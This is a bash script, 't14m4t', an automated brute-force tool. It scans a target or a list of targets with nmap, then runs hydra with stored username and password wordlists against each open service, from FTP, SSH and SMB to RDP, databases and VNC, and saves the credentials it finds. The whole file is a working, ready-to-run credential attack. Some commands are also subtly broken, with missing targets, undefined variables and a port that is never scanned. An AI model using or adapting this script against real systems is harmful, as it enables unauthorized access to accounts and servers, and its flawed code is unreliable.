#!/bin/bash

splash() {
	clear
	echo -e "${red}  __  ____   _____             _____   __   "
	echo -e '_/  |/_   | /  |  |  _____    /  |  |_/  |_ '
	echo -e '\   __\   |/   |  |_/     \  /   |  |\   __\'
	echo -e ' |  | |   /    ^   /  Y Y  \/    ^   /|  |  '
	echo -e ' |__| |___\____   ||__|_|  /\____   | |__|  '
	echo -e "${default}      by: n1x_ ${red}|__|${default}MS-WEB${red}\/      |__|       "
	echo -e "       The Automatic Bruteforce Tool\n ${default}"
}

help() {
	splash
	echo -e "[${yellow}*${default}] Usage: ./${red}t14m4t${default} <target/file> <threads>"
}

report() {
	mkdir Scans Scans/${1} &> /dev/null
	mkdir Output Output/${1} &> /dev/null
}

port_scan() {
	echo -e "[${yellow}*${default}] Target: $1 Number of threads: ${thread}."
	echo -e "[${yellow}*${default}] Starting agressive scan of supported ports against: ${1}...\n"
	sleep 1
	nmap -T4 -Pn -v --open $1 -p 21,22,23,25,53,80,110,139,162,389,443,445,512,513,514,993,1433,1521,3306,3389,5432,5900,5901,6667,8000,8080 -oN Scans/${1}/$1.txt
	echo -e "[${yellow}*${default}] Scan finished."
	sleep 1
}

bruteforce() {
	if grep -q 21/tcp Scans/${1}/${1}.txt; then
		echo -e "[${yellow}*${default}] Port 21(FTP) is open. Starting bruteforce...\n"
		sleep 1
		hydra -C $ftp_up $1 ftp -e ns -o Output/${1}/ftp_${1}.txt -I -V -t $thread
		hydra -L $ftp_u -P $ftp_p $1 ftp -e ns -o Output/${1}/ftp1_${1}.txt -I -V -t $thread
		finished_brute $1
	else
		echo -e "[${red}!${default}] Port 21(FTP) is not open. Skipping to next port..."
	fi

        if grep -q 22/tcp Scans/${1}/${1}.txt; then
                echo -e "[${yellow}*${default}] Port 22(SSH) is open. Starting bruteforce...\n"
		sleep 1
		hydra -C $ssh_up $1 ssh -e ns -o Output/${1}/ssh_${1}.txt -I -V -t $thread
                hydra -L $ssh_u -P $ssh_p $1 ssh -e ns -o Output/${1}/ssh1_${1}.txt -I -V -t $thread
		hydra -L $user -p $pass ssh -e ns -o Output/${1}/ssh2_${1}.txt -I -V -t $thread
                finished_brute $1
        else
                echo -e "[${red}!${default}] Port 22(SSH) is not open. Skipping to next port..."
        fi

        if grep -q 23/tcp Scans/${1}/${1}.txt; then
                echo -e "[${yellow}*${default}] Port 23(Telnet) is open. Starting bruteforce...\n"
		sleep 1
		hydra -C $telnet_up $1 telnet -e ns -o Output/${1}/telnet_${1}.txt -I -V -t $thread
		hydra -L $telnet_u -P $telnet_p $1 telnet -e ns -o Output/${1}/telnet1_${1}.txt -I -V -t $thread
		hydra -L $user -P $pass $1 telnet -e ns -o Output/${1}/telnet2_${1}.txt -I -V -t $thread
		finished_brute $1
        else
                echo -e "[${red}!${default}] Port 23(Telnet) is not open. Skipping to next port..."
        fi

        if grep -q 25/tcp Scans/${1}/${1}.txt; then
                echo -e "[${yellow}*${default}] Port 25(SMTP) is open. Starting bruteforce...\n"
		sleep 1
                hydra -L $user -P $pass $1 smtp-enum -e ns -o Output/${1}/smtp-enum_${1}.txt -I -V -t $thread
		hydra -L $smtp_u -P $smtp_p $1 smtp -e ns -o Output/${1}/smtp_${1}.txt -I -V -t $thread
                hydra -L $user -P $pass $1 smtp -e ns -o Output/${1}/smtp1_${1}.txt -I -V -t $thread
                finished_brute $1
        else
                echo -e "[${red}!${default}] Port 25(SMTP) is not open. Skipping to next port..."
        fi

        if grep -q 80/tcp Scans/${1}/${1}.txt; then
                echo -e "[${yellow}*${default}] Port 80(HTTP) is open. Starting bruteforce...\n"
		sleep 1
		hydra -L $user -P $pass $1 http-get -f -q -e ns -o Output/${1}/http-get_${1}.txt -I -V / -t $thread
                finished_brute $1
        else
                echo -e "[${red}!${default}] Port 80(HTTP) is not open. Skipping to next port..."
        fi

        if grep -q 110/tcp Scans/${1}/${1}.txt; then
                echo -e "[${yellow}*${default}] Port 110(POP3) is open. Starting bruteforce...\n"
		sleep 1
		hydra -L $pop_u -P $pop_p $1 pop3 -e ns -o Output/${1}/pop3_${1}.txt -I -V -t $thread
		hydra -L $user -P $pass $1 pop3 -e ns -o Output/${1}/pop3_1_${1}.txt -I -V -t $thread
                finished_brute $1
        else
                echo -e "[${red}!${default}] Port 110(POP3) is not open. Skipping to next port..."
        fi

        if grep -q 139/tcp Scans/${1}/${1}.txt; then
                echo -e "[${yellow}*${default}] Port 139(SMB) is open. Starting bruteforce...\n"
		sleep 1
		hydra -L $windows_u -P $pass $1 smb -S 139 -e ns -o Output/${1}/smb_139_${1}.txt -I -V -t $thread
                finished_brute $1
        else
                echo -e "[${red}!${default}] Port 139(SMB) is not open. Skipping to next port..."
        fi

        if grep -q 162/tcp Scans/${1}/${1}.txt; then
                echo -e "[${yellow}*${default}] Port 162(SNMP) is open. Starting bruteforce..."
		sleep 1
		hydra -P $snmp snmp -S 162 -e ns -o Output/${1}/snmp_${1}.txt -I -V -t $thread
                finished_brute $1
        else
                echo -e "[${red}!${default}] Port 162(SNMP) is not open. Skipping to next port..."
        fi

        if grep -q 389/tcp Scans/${1}/${1}.txt; then
                echo -e "[${yellow}*${default}] Port 389(LDAP) is open. Starting bruteforce...\n"
		sleep 1
		hydra -L $windows_u -P $pass $1 ldap2 -S 389 -e ns -o Output/${1}/ldap2_${1}.txt -I -V -t $thread
		hydra -L $windows_u -P $pass $1 ldap3 -S 389 -e ns -o Output/${1}/ldap3_${1}.txt -I -V -t $thread
                finished_brute $1
        else
                echo -e "[${red}!${default}] Port 389(LDAP) is not open. Skipping to next port..."
        fi

        if grep -q 443/tcp Scans/${1}/${1}.txt; then
                echo -e "[${yellow}*${default}] Port 443(HTTPS) is open. Starting bruteforce...\n"
		sleep 1
		hydra -L $user -P $pass $1 https-get -s 443 -f -q -e ns -o Output/${1}/https-get_${1}.txt -I -V -m / -t $thread
                finished_brute $1
        else
                echo -e "[${red}!${default}] Port 443(HTTPS) is not open. Skipping to next port..."
        fi

        if grep -q 445/tcp Scans/${1}/${1}.txt; then
                echo -e "[${yellow}*${default}] Port 445(SMB) is open. Starting bruteforce...\n"
		sleep 1
		hydra -C $windows_up $1 smb -S 445 -e ns -o Output/${1}/smb_445_${1}.txt -I -V -t $thread
		hydra -L $windows_u -P $pass $1 smb -S 445 -e ns -o Output/${1}/smb_445_2_${1}.txt -I -V -t $thread
                finished_brute $1
        else
                echo -e "[${red}!${default}] Port 445(SMB) is not open. Skipping to next port..."
        fi

        if grep -q 512/tcp Scans/${1}/${1}.txt; then
                echo -e "[${yellow}*${default}] Port 512(rexec) is open. Starting bruteforce...\n"
		sleep 1
		hydra -L $user -P $pass $1 rexec -S 512 -e ns -o Output/${1}/rexec_${1}.txt -I -V -t $thread
                finished_brute $1
        else
                echo -e "[${red}!${default}] Port 512(rexec) is not open. Skipping to next port..."
        fi

        if grep -q 513/tcp Scans/${1}/${1}.txt; then
                echo -e "[${yellow}*${default}] Port 513(rlogin) is open. Starting bruteforce...\n"
		sleep 1
		hydra -L $user -P $pass $1 rlogin -S 513 -e ns -o Output/${1}/rlogin_${1}.txt -I -V -t $thread
                finished_brute $1
        else
                echo -e "[${red}!${default}] Port 513C(rlogin) is not open. Skipping to next port..."
        fi

        if grep -q 514/tcp Scans/${1}/${1}.txt; then
                echo -e "[${yellow}*${default}] Port 514(rsh) is open. Starting bruteforce...\n"
		sleep 1
		hydra -L $user -P $pass $1 rsh -S 514 -e ns -o Output/${1}/rsh_${1}.txt -I -V -t $thread
                finished_brute $1
        else
                echo -e "[${red}!${default}] Port 514(rsh) is not open. Skipping to next port..."
        fi

        if grep -q 993/tcp Scans/${1}/${1}.txt; then
                echo -e "[${yellow}*${default}] Port 993(IMAP) is open. Starting bruteforce...\n"
		sleep 1
		hydra -L $user -P $pass $1 imap -S 993 -e ns -o Output/${1}/imap_${1}.txt -I -V -t $thread
                finished_brute $1
        else
                echo -e "[${red}!${default}] Port 993(IMAP) is not open. Skipping to next port..."
        fi

        if grep -q 1433/tcp Scans/${1}/${1}.txt; then
                echo -e "[${yellow}*${default}] Port 1433(mssql) is open. Starting bruteforce.../n"
		sleep 1
		hydra -C $mssql_up $1 mssql -S 1433 -e ns -o Output/${1}/mssql_${1}.txt -I -V -t $thread
		hydra -L $windows_u -P $pass $1 mssql -S 1433 -e ns -o Output/${1}/mssql_1_${1}.txt -I -V -t $thread
                finished_brute $1
        else
                echo -e "[${red}!${default}] Port 1433(mssql) is not open. Skipping to next port..."
        fi

        if grep -q 1521/tcp Scans/${1}/${1}.txt; then
                echo -e "[${yellow}*${default}] Port 1521(oracle) is open. Starting bruteforce...\n"
		sleep 1
		hydra -C $oracle_up $1 oracle -S 1521 -e ns -o Output/${1}/oracle_${1}.txt -I -V -t $thread
                finished_brute $1
        else
                echo -e "[${red}!${default}] Port 1521(oracle) is not open. Skipping to next port..."
        fi

        if grep -q 3306/tcp Scans/${1}/${1}.txt; then
                echo -e "[${yellow}*${default}] Port 3306(mysql) is open. Starting bruteforce...\n"
		sleep 1
		hydra -C $mysql_up $1 mysql -e ns -o Output/${1}/mysql_${1}.txt -I -V -t $thread
		hydra -L $sql_u -P $sql_p $TARGET mysql -e ns -o Output/${1}/mysql_1_${1}.txt -I -V -t $thread
                finished_brute $1
        else
                echo -e "[${red}!${default}] Port 3306(mysql) is not open. Skipping to next port..."
        fi

        if grep -q 3389/tcp Scans/${1}/${1}.txt; then
                echo -e "[${yellow}*${default}] Port 3389(RDP) is open. Starting bruteforce...\n"
		sleep 1
		hydra -C $windows_u $1 rdp -e ns -o Output/${1}/rdp_${1}.txt -I -V -t $thread
		hydra -L $windows_u -P $pass $1 rdp -e ns -o Output/${1}/rdp_1_${1}.txt -I -V -t $thread
		finished_brute $1
        else
                echo -e "[${red}!${default}] Port 3389(RDP) is not open. Skipping to next port..."
        fi

        if grep -q 5432/tcp Scans/${1}/${1}.txt; then
                echo -e "[${yellow}*${default}] Port 5432(postgres) is open. Starting bruteforce...\n"
		sleep 1
		hydra -C $postgres_up $1 postgres -e ns -o Output/${1}/postgres_1_${1}.txt -I -V -t $thread
		finished_brute $1
        else
                echo -e "[${red}!${default}] Port 5432(postgres) is not open. Skipping to next port..."
        fi

        if grep -q 5900/tcp Scans/${1}/${1}.txt; then
                echo -e "[${yellow}*${default}] Port 5900(VNC) is open. Starting bruteforce...\n"
		sleep 1
		hydra -P $vnc_p $1 vnc -S 5900 -e ns -o Output/${1}/vnc_5900_${1}.txt -I -V -t $thread
		hydra -P $pass $1 vnc -S 5900 -e ns -o Output/${1}/vnc_5900_1_${1}.txt -I -V -t $thread
		finished_brute $1
        else
                echo -e "[${red}!${default}] Port 5900(VNC) is not open. Skipping to next port..."
        fi

        if grep -q 5901/tcp Scans/${1}/${1}.txt; then
                echo -e "[${yellow}*${default}] Port 5901(VNC) is open. Starting bruteforce...\n"
		sleep 1
		hydra -P $vnc_p $1 vnc -S 5901 -e ns -o Output/${1}/vnc_5901_${1}.txt -I -V -t $thread
		hydra -P $pass $1 vnc -S 5901 -e ns -o Output/${1}/vnc_5901_${1}.txt -I -V -t $thread
		finished_brute $1
        else
                echo -e "[${red}!${default}] Port 5901(VNC) is not open. Skipping to next port..."
        fi

        if grep -q 6667/tcp Scans/${1}/${1}.txt; then
                echo -e "[${yellow}*${default}] Port 6667(IRC) is open. Starting bruteforce...\n"
		sleep 1
		hydra -L $user -P $pass $1 irc -s 6667 -e ns -o Output/${1}/irc_${1}.txt -I -V -t $thread
		finished_brute $1
        else
                echo -e "[${red}!${default}] Port 6667(IRC) is not open. Skipping to next port..."
        fi

        if grep -q 8000/tcp Scans/${1}/${1}.txt; then
                echo -e "[${yellow}*${default}] Port 8000(HTTP HEAD) is open. Starting bruteforce...\n"
		sleep 1
		hydra -L $user -P $pass $1 http-head -s 8000 -f -q -e ns -o Output/${1}/http-head_8000_${1}.txt -I -V -m / -t $thread
		finished_brute $1
        else
                echo -e "[${red}!${default}] Port 514(HTTP HEAD) is not open. Skipping to next port..."
        fi

        if grep -q 8080/tcp Scans/${1}/${1}.txt; then
                echo -e "[${yellow}*${default}] Port 8080(HTTP HEAD) is open. Starting bruteforce...\n"
		sleep 1
		hydra -L $user -P $pass $1 http-head -S 8080 -f -q -e ns -o Output/${1}/http-head_8080_${1}.txt -I -V -m / -t $thread
		finished_brute $1
        else
                echo -e "[${red}!${default}] Port 8080(HTTP HEAD) is not open. Skipping to next port..."
        fi

        if grep -q 8100/tcp Scans/${1}/${1}.txt; then
                echo -e "[${yellow}*${default}] Port 8100(HTTP HEAD) is open. Starting bruteforce...\n"
		sleep 1
                hydra -L $user -P $pass $1 http-head -S 8100 -f -q -e ns -o Output/${1}/http-head_8100_${1}.txt -I -V -m / -t $thread
		finished_brute $1
        else
                echo -e "[${red}!${default}] Port 8100(HTTP HEAD) is not open. Quitting..."
        fi
}

finished_brute() {
                echo -e "[${green}*${default}] Bruteforce finished. Credentials found saved at: Output/${1}/."
                sleep 1
}

	red='\033[0;31m'
	green='\033[0;32m'
	yellow='\033[0;33m'
	default='\033[0;39m'

	ftp_up="/root/.africana/africana-base/crackers/wordlists/cybrute/ftp_up.txt"
	ftp_u="/root/.africana/africana-base/crackers/wordlists/cybrute/ftp_u.txt"
	ftp_p="/root/.africana/africana-base/crackers/wordlists/cybrute/ftp_p.txt"
	ssh_up="/root/.africana/africana-base/crackers/wordlists/cybrute/ssh_up.txt"
	ssh_u="/root/.africana/africana-base/crackers/wordlists/cybrute/ssh_u.txt"
	ssh_p="/root/.africana/africana-base/crackers/wordlists/cybrute/ssh_p.txt"
	smtp_u="/root/.africana/africana-base/crackers/wordlists/cybrute/smtp_u.txt"
	smtp_p="/root/.africana/africana-base/crackers/wordlists/cybrute/smtp_p.txt"
	pop_u="/root/.africana/africana-base/crackers/wordlists/cybrute/pop_u.txt"
	pop_p="/root/.africana/africana-base/crackers/wordlists/cybrute/pop_p.txt"
	telnet_up="/root/.africana/africana-base/crackers/wordlists/cybrute/telnet_up.txt"
	telnet_u="/root/.africana/africana-base/crackers/wordlists/cybrute/telnet_u.txt"
	telnet_p="/root/.africana/africana-base/crackers/wordlists/cybrute/telnet_p.txt"
	sql_u="/root/.africana/africana-base/crackers/wordlists/cybrute/sql_u.txt"
	sql_p="/root/.africana/africana-base/crackers/wordlists/cybrute/sql_p.txt"
	mssql_up="/root/.africana/africana-base/crackers/wordlists/cybrute/mssql_up.txt"
	mysql_up="/root/.africana/africana-base/crackers/wordlists/cybrute/mysql_up.txt"
	oracle_up="/root/.africana/africana-base/crackers/wordlists/cybrute/oracle_up.txt"
	postgres_up="/root/.africana/africana-base/crackers/wordlists/cybrute/postgres_up.txt"
	windows_u="/root/.africana/africana-base/crackers/wordlists/cybrute/windows_u.txt"
	windows_up="/root/.africana/africana-base/crackers/wordlists/cybrute/windows_up.txt"
	user="/root/.africana/africana-base/crackers/wordlists/cybrute/user.txt"
	pass="/root/.africana/africana-base/crackers/wordlists/cybrute/pass.txt"
	snmp_p="/root/.africana/africana-base/crackers/wordlists/cybrute/snmp.txt"
	vnc_p="/root/.africana/africana-base/crackers/wordlists/cybrute/vnc_p.txt"

	thread="16"

	splash

        if [ $# -eq 0 ]; then
                echo -e "[${red}!${default}] Error: No arguments supplied."
                echo -e "[${yellow}*${default}] Usage: ./t14m4t <target/file> <threads>"

		exit
	fi
	if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
		help
		exit
	fi
        if [ ! -z "$2" ]; then
                if [ "$2" -gt "64" ] || [ "$2" -lt "1" ]; then
                        echo -e "[${red}!${default}] Maximum number of threads is 64!"
                        exit
                else
                	thread=$2
                fi
        fi

	if [[ -f $1 ]]; then
		while IFS= read -r line
			do
				sleep 1
				report $line
				port_scan $line
				bruteforce $line $2
		done < "$1"
		exit
	fi

	sleep 1
	report $1
	port_scan $1
	bruteforce $1 $2
